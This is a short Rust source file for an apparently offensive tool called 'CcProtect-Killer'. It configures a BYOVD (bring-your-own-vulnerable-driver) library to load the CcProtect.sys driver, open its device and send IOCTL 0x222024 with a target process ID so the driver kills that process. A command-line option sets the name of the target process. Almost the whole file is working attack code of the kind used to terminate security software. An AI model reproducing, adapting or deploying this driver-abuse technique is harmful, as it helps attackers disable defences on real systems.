use byovd_lib::{DriverConfig, Result};
use clap::Parser;

// ============================================================================
// Driver Configuration - CcProtect
// ============================================================================

struct CcProtect;

impl DriverConfig for CcProtect {
    fn driver_name(&self) -> &str {
        "CcProtect"
    }

    fn driver_file(&self) -> &str {
        "CcProtect.sys"
    }

    fn device_path(&self) -> &str {
        "\\\\.\\CcProtect"
    }

    fn ioctl_code(&self) -> u32 {
        0x222024
    }

    fn build_ioctl_input(&self, pid: u32, _process_name: &str) -> Vec<u8> {
        pid.to_ne_bytes().to_vec()
    }

    fn ioctl_output_size(&self) -> usize {
        4
    }
}

// ============================================================================
// CLI
// ============================================================================

#[derive(Parser)]
#[command(name = "CcProtect-Killer", version, author = "BlackSnufkin, wwwab")]
#[command(about = "BYOVD process killer using CcProtect driver")]
struct Cli {
    /// Target process name (e.g., notepad.exe)
    #[arg(short = 'n', long = "name", required = true)]
    process_name: String,
}

// ============================================================================
// Main
// ============================================================================

fn main() -> Result<()> {
    let cli = Cli::parse();
    byovd_lib::run(&CcProtect, &cli.process_name, None)
}
